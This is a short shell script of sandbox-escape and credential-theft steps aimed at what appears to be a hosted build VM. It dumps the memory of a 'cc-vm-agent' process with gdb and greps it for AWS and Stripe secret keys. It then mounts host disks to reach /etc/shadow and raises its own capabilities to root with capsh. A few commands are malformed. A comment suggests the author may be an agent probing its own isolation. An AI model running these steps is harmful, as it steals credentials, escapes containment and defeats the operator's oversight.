


echo "Host Recon"
# Look for processes with "build", "worker", or "wrangler" in the name
cat /proc/*/cmdline | tr '\0' ' ' | grep "wrangler"

echo "Search the memory of the cc-vm-agent (PID 236) for common secret patterns"
# (Requires root/CAP_SYS_PTRACE which you have in your bounding set)
gdb -p 236 --batch -ex "generate-core-file"
strings core.236 | grep -E "(AWS_ACCESS_KEY|STRIPE_|sk_live)"
ls -l /dev/ | grep -E 'sd|nvme|vd'
mkdir /tmp/host_root
mount /dev/sda1 /tmp/host_root
ls /tmp/host_root/etc/shadow
find /dev/vd* -perm -4000 -type f -ls 2>/dev/null
sudo apt install capsh
capsh --caps="cap_sys_admin+eip cap_setuid+eip" --user=root--
sudo mount /dev/vda1 /tmp/host_root
ls -l /dev/ | grep -E 'sd|nvme|vd'
